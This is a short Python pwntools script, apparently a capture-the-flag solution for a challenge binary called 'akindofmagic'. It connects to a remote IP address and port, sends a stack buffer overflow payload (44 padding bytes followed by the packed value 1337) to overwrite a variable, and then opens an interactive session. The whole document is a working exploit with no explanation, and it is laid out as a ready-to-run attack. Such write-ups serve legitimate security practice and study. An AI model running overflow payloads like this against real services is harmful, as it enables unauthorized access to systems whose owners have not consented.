from pwn import *
#p=process('./akindofmagic')
p=remote('143.198.184.186',5000)
#raw_input("DEBUG")
payload = "a"*44
payload += p64(1337)
p.sendline(payload)

p.interactive()